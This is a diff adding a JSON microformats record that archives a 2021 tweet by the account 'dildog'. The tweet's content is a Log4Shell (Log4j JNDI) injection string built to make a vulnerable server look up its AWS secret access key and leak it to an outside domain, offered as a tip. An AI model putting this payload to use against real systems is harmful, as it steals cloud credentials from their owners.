@@ -1,0 +1,24 @@
+{
+  "properties" : {
+    "author" : [ {
+      "properties" : {
+        "name" : [ "DilDog" ],
+        "nickname" : [ "dildog" ],
+        "numeric-id" : [ "14159456" ],
+        "photo" : [ "https://pbs.twimg.com/profile_images/1455175510972108805/pfjIl_n4.jpg" ],
+        "published" : [ "2008-03-16T21:15:31+00:00" ],
+        "uid" : [ "tag:twitter.com:dildog" ],
+        "url" : [ "https://twitter.com/dildog", "http://hack.xxx" ]
+      },
+      "type" : [ "h-card" ]
+    } ],
+    "content" : [ {
+      "html" : "<div style=\"white-space: pre\">don't forget you can get those sweet environment variables\n\n${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}</div>",
+      "value" : "don't forget you can get those sweet environment variables\n\n${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}"
+    } ],
+    "published" : [ "2021-12-11T21:48:29+00:00" ],
+    "uid" : [ "tag:twitter.com:1469786190144585729" ],
+    "url" : [ "https://twitter.com/dildog/status/1469786190144585729" ]
+  },
+  "type" : [ "h-entry" ]
+}
